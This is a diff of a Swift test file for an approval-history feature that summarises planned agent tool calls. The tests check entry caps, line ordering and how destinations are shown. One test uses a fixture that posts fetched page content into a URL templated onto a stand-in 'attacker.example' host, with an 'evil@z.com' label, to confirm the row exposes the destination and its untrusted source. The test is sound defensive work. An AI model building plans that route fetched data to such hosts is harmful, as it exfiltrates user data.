@@ -351,19 +351,18 @@ import Testing
     @Test func historyNamesEveryLineNobodyReadAndSaysItWasNotAPlanTheyRead() async throws {
         let w = try await World()
         try await w.setMode(.fullAccess)
-        // 24 different long lines: History clips every string where it keeps it, so each is its own short entry, and the ones past the cap are counted.
+        // 40 different long lines: History clips every string where it keeps it, so each line and each field is its own short entry, and past 60 entries they are counted.
         let filler = String(repeating: "and a long, long sentence about nothing at all ", count: 8)
-        let steps: [JSONValue] = (0..<24).map { ["tool": "notify.user", "input": ["title": .string("Step \($0) \(filler)")]] }
-        let plan = FlowApprovalTests.plan(steps)
-        #expect(await !w.approve(plan).asked)
+        let steps: [JSONValue] = (0..<40).map { ["tool": "notify.user", "input": ["title": .string("Step \($0) \(filler)")]] }
+        #expect(await !w.approve(FlowApprovalTests.plan(steps)).asked)
         let row = try await w.rows("extensions.plan").first
         #expect(row?.decision == .fullAccessPlan)
         let lines = row?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.count == 20 && lines.last == "+5 more", "past twenty, the rest are counted: \(lines.suffix(2))")
-        for i in 0..<19 { #expect(lines[i].contains("Step \(i) "), "line \(i) survives the clip and the redaction: \(lines[i])") }
+        #expect(lines.count == 60 && lines.last == "+21 more", "past sixty, the rest are counted: \(lines.suffix(2))")
+        for i in 0..<29 { #expect(lines[2 * i + 1].contains("Step \(i) "), "line \(i) survives the clip and the redaction: \(lines[2 * i + 1])") }
         // And on the screen: History shows a list one entry to a line, uncut, so the count at its end is there to read.
         let shown = ActivityArguments.rows(row?.args).first { $0.name == "lines" }?.value.split(separator: "\n").map(String.init) ?? []
-        #expect(shown.count == 20 && shown.last == "+5 more" && shown[18].contains("Step 18 "), "\(shown.suffix(2))")
+        #expect(shown.count == 60 && shown.last == "+21 more" && shown[57].contains("Step 28 "), "\(shown.suffix(2))")
     }
 
     @Test func historyNamesWhatNobodyReadAndSaysItWasNotAPlanTheyRead() async throws {
@@ -479,21 +478,25 @@ import Testing
         let post = FlowApprovalTests.post(["body": .string(long), "title": "Weekly"])
         #expect(await !w.approve(FlowApprovalTests.plan([post])).asked)
         let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.count == 1 && lines[0].contains("repo: “me/digest”"), "where it goes comes first, whatever the body: \(lines)")
-        #expect(lines[0].contains("GitHub"), "and who gets it")
+        #expect(lines.contains { $0.contains("/ repo: “me/digest”") && $0.contains("GitHub") }, "where it goes, and who gets it, whatever the body: \(lines)")
+        #expect(lines.firstIndex { $0.contains("/ repo:") } ?? 99 < lines.firstIndex { $0.contains("/ body:") } ?? 0, "places before free words")
     }
 
-    @Test func aPlaceWithWrittenWordsAroundASlotKeepsThemAndSaysWhereTheWordsComeFrom() async throws {
+    @Test func theRowHidesNoLiteralNoListItemNoDestinationAndNoKindOfSource() async throws {
         let w = try await World()
         _ = try w.registerHub()
         try await w.setMode(.fullAccess)
         let long = String(repeating: "x", count: 300)
-        let post = FlowApprovalTests.post(["repo": "https://hooks.example.com/{{page}}", "body": .string(long)])
-        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.page, post])).asked)
+        let second: JSONValue = ["tool": "web.fetch", "as": "path", "input": ["url": "https://news.example.com/b"]]
+        let post = FlowApprovalTests.post(["repo": "https://{{page}}.attacker.example/{{path}}", "body": .string(long), "labels": ["a@x.com", "b@y.com", "evil@z.com"]])
+        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.page, second, post])).asked)
         let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        let line = lines.first { $0.contains("Create an issue") } ?? ""
-        #expect(line.contains("repo: https://hooks.example.com/[from") && line.contains("(outside content)"), "the host and the kind of source are on the row: \(lines)")
-        #expect(line.contains("program: not checked") == false, "this server's program was checked")
+        let repo = lines.first { $0.contains("/ repo:") } ?? ""
+        #expect(repo.contains("https://[from") && repo.contains("].attacker.example/[from") && repo.contains("(outside content)"), "every written part between slots, and the kind: \(repo)")
+        let labels = lines.first { $0.contains("/ labels:") } ?? ""
+        #expect(labels.contains("list (3)") && labels.contains("evil@z.com"), "every item and how many: \(labels)")
+        #expect(lines.first { $0.contains("/ body:") }?.contains("[") == true, "a long field says it was cut")
+        #expect(!lines.contains { $0.contains("program: not checked") }, "this server's program was checked")
     }
 
     @Test func aWholeSlotOnAStringFieldTakesNoRecordBecauseTheSchemaRefusesIt() async throws {
